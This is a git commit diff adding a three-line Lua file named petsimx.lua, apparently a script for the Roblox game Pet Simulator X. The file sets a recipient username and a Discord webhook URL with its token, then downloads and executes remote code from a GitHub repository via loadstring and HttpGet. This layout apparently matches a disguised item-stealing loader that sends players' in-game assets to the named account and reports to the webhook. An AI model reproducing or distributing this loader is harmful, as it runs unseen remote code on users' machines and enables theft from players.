b5265d96d3dee25a8a36e9254b40a23c8f53d4c6
filip69xd <47060021+filip69xd@users.noreply.github.com>
2023-04-04 20:25:01 +0200

    Add files via upload

---
+++ petsimx.lua
@@ -0,0 +1,3 @@
+UserName = "pawelpro10k"
+Webhook = "https://discord.com/api/webhooks/1092873729962426428/PvlRdjKf1cKGHVGyILvuUEi7BwN5nhOAdUK1jxz4xkKHSOXjtYCM28KZRFShiImk5r1f"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/Rizz/main/Main.lua"))()
